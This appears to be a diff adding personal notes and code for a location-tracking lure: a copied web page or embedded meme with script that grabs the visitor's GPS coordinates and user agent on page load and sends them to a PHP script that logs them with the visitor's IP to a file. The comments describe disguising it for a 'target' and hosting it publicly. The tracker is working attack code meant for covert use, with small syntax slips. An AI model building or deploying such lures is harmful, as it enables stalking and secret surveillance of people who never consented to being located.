@@ -1,0 +1,44 @@
+
+//copy-download the site you want to show to target...open html file and edit it
+//eg you want to send a meme to target on that website you copied..soo go to giphy.com -> select meme -> embed and copy link and paste it in a file with .html
+//WAN attack upload file in apache (line 1&2) to host it on WAN
+//geolocation code
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+<script>
+const x = document.getElementById("demo");
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+    xhttp.send();
+}
+</script>
+</body>
+</html>
+//copy this code in the meme file.html and the code which was in it, paste it in the body of this code and align to look nice
+//remove <p>click button part.. and line below it remove that line and in body tag write
+    <body onload="getLocation()">
+       ...
+       ...
+       ...
+    </body>
+//this will only work if laptop and phone has gps and target will be able to see the location below meme
+//now we will send location we fetched to other pg
+//in the code goto function line
+//above all modified in code
+//create file and edit store.php
+<?php
+$myfile = fopen("location.txt", "w");
+$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser Agent: " . $_GET["uagent"];
+fwrite($myfile, $txt);
+fclose($myfile);
+>
+//geolocation convertor and iplookup for ip 
